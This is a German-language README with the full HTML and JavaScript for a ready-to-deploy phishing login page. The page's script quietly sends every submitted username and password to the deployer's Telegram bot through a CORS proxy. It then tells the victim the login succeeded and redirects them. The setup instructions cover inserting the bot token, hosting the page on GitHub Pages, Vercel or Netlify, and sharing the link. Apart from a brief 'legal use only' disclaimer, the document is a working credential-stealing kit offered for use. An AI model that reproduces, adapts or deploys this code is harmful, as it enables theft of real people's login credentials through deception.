# Phishing Login Page (Deutsch)

Eine einfache, aber effektive Phishing-Anmeldeseite auf Deutsch mit modernem blauem Design.  
Nach dem Absenden der Daten werden Benutzername und Passwort **stillschweigend an deinen Telegram-Bot** gesendet und der Nutzer wird automatisch weitergeleitet.

Perfekt für Tests oder Demonstrationszwecke (nutze es nur legal und ethisch!).

## Vorschau

![Vorschau der Login-Seite](preview.png)
*(Füge hier einen Screenshot deiner Seite als `preview.png` ins Repo hinzu, damit es schöner aussieht)*

## Funktionen

- Schönes responsives Design (blau/lila Gradient)
- Deutsche Sprache
- Daten werden per Telegram Bot empfangen
- Nach Login: Erfolgsmeldung + automatische Weiterleitung
- Kein Backend nötig – läuft komplett auf statischem Hosting (GitHub Pages, Vercel, Netlify, etc.)

## Setup-Anleitung

1. **Ersetze die Platzhalter im Code:**
   - `botToken` → Dein Telegram Bot Token
   - `chatId` → Deine Chat-ID
   - `redirectUrl` → Die URL, wohin nach dem Login weitergeleitet werden soll (z. B. Google, YouTube, eine fake Dashboard-Seite)

2. **Lade die `index.html` hoch** (der Code aus deinem Repo).

3. **Deploye den Site:**
   - GitHub Pages: Gehe zu Settings → Pages → Branch: main → Save
   - Oder Vercel/Netlify/Cloudflare Pages (einfach Repo verbinden)

4. Fertig! Teile den Link – bei jedem Login bekommst du eine Nachricht in Telegram.

## Wichtige Sicherheitshinweise

- Der Bot-Token ist im Code sichtbar → Jeder mit Zugriff auf den Quellcode kann dir spammen.
- Für echte Sicherheit: Später auf einen eigenen Proxy (z. B. Vercel Serverless Function) umstellen.
- Nutze das nur in legalen/umgänglichen Szenarien (z. B. Penetration Testing mit Erlaubnis).

## Code (index.html)

```html
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anmeldung</title>
    <style>
        /* ... (der komplette CSS aus deinem Code) ... */
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Anmeldung</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Benutzername" required>
            <input type="password" id="password" placeholder="Passwort" required>
            <button type="submit">Einloggen</button>
        </form>
        <div id="status"></div>
        <div class="footer">Willkommen zurück!</div>
    </div>

    <iframe name="hiddenIframe" style="display:none;"></iframe>

    <script>
        const botToken = "DEIN_BOT_TOKEN_HIER";
        const chatId = "DEINE_CHAT_ID_HIER";
        const proxyUrl = "https://corsproxy.io/?";
        const redirectUrl = "https://www.google.com"; // ← Ändern!

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            const rawUsername = document.getElementById("username").value;
            const rawPassword = document.getElementById("password").value;
            const text = encodeURIComponent(`🔔 Neuer Login-Versuch!\n\n👤 Benutzername: ${rawUsername}\n🔑 Passwort: ${rawPassword}`);
            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}&parse_mode=HTML`;
            const fullUrl = proxyUrl + encodeURIComponent(apiUrl);

            const iframe = document.createElement('iframe');
            iframe.src = fullUrl;
            iframe.style.display = "none";
            document.body.appendChild(iframe);
            setTimeout(() => document.body.removeChild(iframe), 1000);

            document.getElementById("status").innerHTML = "Erfolgreich angemeldet! Weiterleitung... 🔄";
            document.getElementById("status").style.color = "#28a745";

            document.getElementById("username").value = "";
            document.getElementById("password").value = "";

            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 2000);
        });
    </script>
</body>
</html>
